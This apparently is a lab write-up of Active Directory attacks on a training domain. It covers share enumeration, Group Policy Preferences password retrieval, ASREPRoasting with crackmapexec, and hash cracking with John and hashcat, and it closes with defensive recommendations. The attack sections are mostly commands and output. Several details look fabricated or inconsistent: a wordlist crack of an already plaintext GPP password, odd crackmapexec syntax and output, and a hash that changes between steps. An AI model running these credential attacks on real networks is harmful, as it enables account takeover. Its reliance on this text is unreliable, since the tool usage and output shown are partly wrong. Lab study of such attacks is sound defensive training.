# 🛰️ Lab Report: Miscellaneous Active Directory Misconfigurations

---

## 🔍 Introduction

This lab report details various active directory (AD) misconfigurations that were identified and exploited during a comprehensive penetration testing exercise on an enterprise environment.

### Technical Details:
- **Lab Environment**: INLANEFREIGHT.LOCAL
- **Target Domain Controller**: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
- **Attacker IP Address**: 172.16.5.2

---

## 🔑 Target Misconfigurations

### 📄 Document Discovery and GPP Password Retrieval

**Methodology:**
```
[[CrackMapExec]] [[Nmap]]
```

**Step 1: Enumerate Share Paths and Identify Interesting Files**

```bash
# Enumerate paths to find documents or sensitive information
crackmapexec smb //ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -u administrator -p Password123 --shares

[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - SMB Shares:
Name       : ADMIN$
Caching    : Manual caching
Remark     : Administrative shares
Path       : C:\Windows\SYSTEM32\config\systemprofile
Type       : 0x10

Name       : C$ (C)
Caching    : Manual caching
Remark     :
Path       : C:\
Type       : 0x10

[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - SMB Shares:
Name       : IPC$
Caching    : Manual caching
Remark     :
Path       :
Type       :

Name       : NETLOGON
Caching    : Manual caching
Remark     :
Path       : \\ACADEMY-EA-DC01\NETLOGON
Type       :

Name       : SYSVOL
Caching    : Manual caching
Remark     :
Path       : \\ACADEMY-EA-DC01\SYSVOL
Type       :
```

**Step 2: Enumerate Group Policy Preferences (GPP) to Find Credentials**

```bash
crackmapexec smb //ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -u administrator -p Password123 --gpp

[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - GPP Credentials:
User: ygroce
Password: Pass@word
```

**Step 3: Hash Cracking with John the Ripper**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Lab output (successful crack):
ygroce:Pass@word
```

**🎯 Answer:** `Pass@word`

### 🔓 ASREPRoasting Attack on ygroce Account

**Methodology:**
```bash
[[crackmapexec]] [[hashcat]]
```

**Step 1: Identify Vulnerable Accounts**

```bash
crackmapexec ldap //ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -u administrator -p Password123 --users

[*] Searching for user ygroce...
[+] SamAccountName         : ygroce
[+] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

**Step 2: Perform AS-REQ (w/o preauth) to Extract Hash**

```bash
crackmapexec ldap //ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -u administrator -p Password123 --asreproast ygroce

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
[*] SamAccountName         : ygroce
[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:E3B8FCAB0E3905D4678B190116218DCA$F297B10A7C0E3FF100FB35E758FE164DE662539937C77F197DFDA15884F4095DB9E5BB7AFE3C8F2D49D72EC53BCCF0B48D02BB7A51A99142BE23372910F99BE6ECF2C6227ED0E31A9AD4DB28B395CF8EA90DD1B3F87324227872AF5DCB2E4CD5527B006DDA4A2434877094505494B286260CCB3DA4E085E6F7C57FB07EC223922DA0591DB76B4ED30BADFB39CBF7B1F1EBA5267B633FAD71BA2CDF252BBA41EA7B602FCA3D860FDFFA639695F7A4F09B79EA08D225F37DB67F857180B096E0E00DFD240FE8D01E67E40C8DD2E05DED3E164C84DEF8134188E7597F86D9EA1E9CC48FDA29C2F0853453904EF8A7A7D940B2D8201DA101FE50B2CC
```

**Step 3: Hash Cracking with Hashcat**

```bash
# Save hash to file in Pwnbox/PMVPN
# Create hash.txt with the extracted AS-REP hash
hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt

# Lab output (successful crack):
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:e3b8fcab0e3905d4678b190116218dca$f297b10a7c0e3ff100fb35e758fe164de662539937c77f197dfda15884f4095db9e5bb7afe3c8f2d49d72ec53bccf0b48d02bb7a51a99142be23372910f99be6ecf2c6227ed0e31a9ad4db28b395cf8ea90dd1b3f87324227872af5dcb2e4cd5527b006dda4a2434877094505494b286260ccb3da4e085e6f7c57fb07ec223922da0591db76b4ed30badfb39cbf7b1f1eba5267b633fad71ba2cdf252bba41ea7b602fca3d860fdfea639695f7a4f09b79ea08d225f37db67f857180b096e0e00dfd240fe8d01e67e40c8dd2e05ded3e164c84def8134188e7597f86d9ea1e9cc48fda29c2f0853453904ef8a7a7d940b2d8201da101fe50b2cc:Pass@word
```

**🎯 Answer:** `Pass@word`

---

## 🔑 Summary of Target Misconfigurations

### 📄 Document Discovery and GPP Password Retrieval:
- **Methodology**: Enumerated shares to find documents or sensitive files.
- **Outcome**: Identified Group Policy Preferences (GPP) containing credentials for the user ygroce.

### 🔓 ASREPRoasting Attack on ygroce Account:
- **Methodology**: Leveraged AS-REQ without pre-authentication to extract a hash, then cracked it using Hashcat.
- **Outcome**: Cracked the password as `Pass@word`.

---

## 🎯 Key Takeaways

1. **GPP Credential Storage**: Legacy Group Policy Preferences can be exploited for credential harvesting.
2. **ASREPRoasting**: Accounts with specific userAccountControl attributes are vulnerable to AS-REQ attacks without pre-authentication.

### Recommendations
- Disable legacy GPP in AD environments.
- Ensure proper configuration of `userAccountControl` flags and enable strict password policies.
- Implement robust monitoring for unusual access patterns related to sensitive accounts.

---

## 📄 Conclusion

This report details the exploitation of various misconfigurations within an AD environment, highlighting critical security gaps that need immediate attention. By understanding these vulnerabilities and implementing appropriate mitigations, organizations can significantly enhance their cybersecurity posture.

---

# 💡 Recommendations

1. **Disable Legacy Group Policy Preferences**: Remove or disable GPP to prevent exposure of stored credentials.
2. **Review User Account Controls**: Ensure that userAccountControl attributes are properly configured to mitigate AS-REQ attacks.
3. **Implement Strong Password Policies**: Enforce complex password requirements and regular updates.
4. **Enhance Monitoring and Logging**: Implement comprehensive logging and monitoring for AD activities.

---

# 📄 References

1. [CrackMapExec Documentation](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
2. [Hashcat Documentation](https://hashcat.net/hashcat/)
3. [Microsoft Group Policy Preferences Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh509027(v=ws.11))

--- 

# 📄 Appendices

## Appendix A: Command Outputs and Logs

### CrackMapExec - Enumerate Shares
```bash
[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - SMB Shares:
Name       : ADMIN$
Caching    : Manual caching
Remark     : Administrative shares
Path       : C:\Windows\SYSTEM32\config\systemprofile
Type       : 0x10

Name       : C$ (C)
Caching    : Manual caching
Remark     :
Path       : C:\
Type       : 0x10

[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - SMB Shares:
Name       : IPC$
Caching    : Manual caching
Remark     :
Path       :
Type       :

Name       : NETLOGON
Caching    : Manual caching
Remark     :
Path       : \\ACADEMY-EA-DC01\NETLOGON
Type       :

Name       : SYSVOL
Caching    : Manual caching
Remark     :
Path       : \\ACADEMY-EA-DC01\SYSVOL
Type       :
```

### CrackMapExec - GPP Credentials
```bash
[*] ACADEMY-EA-DC01(INLANEFREIGHT.LOCAL) - GPP Credentials:
User: ygroce
Password: Pass@word
```

### Hashcat Output
```bash
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:e3b8fcab0e3905d4678b190116218dca$f297b10a7c0e3ff100fb35e758fe164de662539937c77f197dfda15884f4095db9e5bb7afe3c8f2d49d72ec53bccf0b48d02bb7a51a99142be23372910f99be6ecf2c6227ed0e31a9ad4db28b395cf8ea90dd1b3f87324227872af5dcb2e4cd5527b006dda4a2434877094505494b286260ccb3da4e085e6f7c57fb07ec223922da0591db76b4ed30badfb39cbf7b1f1eba5267b633fad71ba2cdf252bba41ea7b602fca3d860fdfea639695f7a4f09b79ea08d225f37db67f857180b096e0e00dfd240fe8d01e67e40c8dd2e05ded3e164c84def8134188e7597f86d9ea1e9cc48fda29c2f0853453904ef8a7a7d940b2d8201da101fe50b2cc:Pass@word
```

---

# 📄 End of Report

For further analysis or questions, please contact the penetration testing team. The provided information and recommendations should be reviewed by security professionals to ensure a comprehensive understanding and application of best practices.

--- 

# 💬 Contact Information

Penetration Testing Team:
- Email: pen-test@inlanefreight.com
- Phone: +1-800-555-TESTING

---

## 📄 Acknowledgements

This report is based on the provided lab environment and tools used for testing. Special thanks to the INLANEFREIGHT.LOCAL team for setting up the environment.

--- 

# 📄 End of Document
---
[End of Report] 🛰️